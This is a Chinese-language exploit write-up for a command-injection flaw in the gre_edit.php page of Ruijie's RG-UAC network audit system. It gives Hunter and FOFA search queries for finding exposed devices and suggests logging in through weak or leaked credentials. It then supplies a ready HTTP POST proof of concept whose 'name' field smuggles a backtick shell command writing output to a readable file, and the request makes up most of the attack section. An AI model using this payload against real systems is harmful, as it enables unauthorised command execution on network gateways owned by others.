# 锐捷RG-UAC统一上网行为管理审计系统gre_edit后台命令执行漏洞

# 一、漏洞简介
锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台 。

# 二、影响版本
+ 锐捷RG-UAC统一上网行为管理审计系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 RG-UAC"`
+ fofoa:`app="Ruijie-RG-UAC"`

登录页

![1711942665811-46dbe53d-d2cc-433f-ac40-7a78aa2d4c6c.png](./img/wf8C3DaCBPoqZ1fi/1711942665811-46dbe53d-d2cc-433f-ac40-7a78aa2d4c6c-701572.png)

# 四、漏洞复现
使用弱口令/敏感信息泄露漏洞登录系统后台

![1714985896501-ee5e7557-a9fe-4b1f-9baa-a777b9f147e5.png](./img/wf8C3DaCBPoqZ1fi/1714985896501-ee5e7557-a9fe-4b1f-9baa-a777b9f147e5-874417.png)

获取Cookie后使用下面poc

```plain
POST /view/networkConfig/GRE/gre_edit.php HTTP/1.1
Host: 
Cookie: PHPSESSID=ae63a240e1fdfb5614107040d19120f3
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 17

name=`pwd+>1.txt`
```

![1714985931696-3bd8e43e-817b-4b7f-b9b1-7f3664b0a1c6.png](./img/wf8C3DaCBPoqZ1fi/1714985931696-3bd8e43e-817b-4b7f-b9b1-7f3664b0a1c6-200127.png)

```plain
/view/networkConfig/GRE/1.txt
```

![1714986112359-00f98557-ca7c-4184-b5be-8717fce28791.png](./img/wf8C3DaCBPoqZ1fi/1714986112359-00f98557-ca7c-4184-b5be-8717fce28791-931665.png)



> 更新: 2024-06-24 11:42:28  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yig773u39hvi17q6>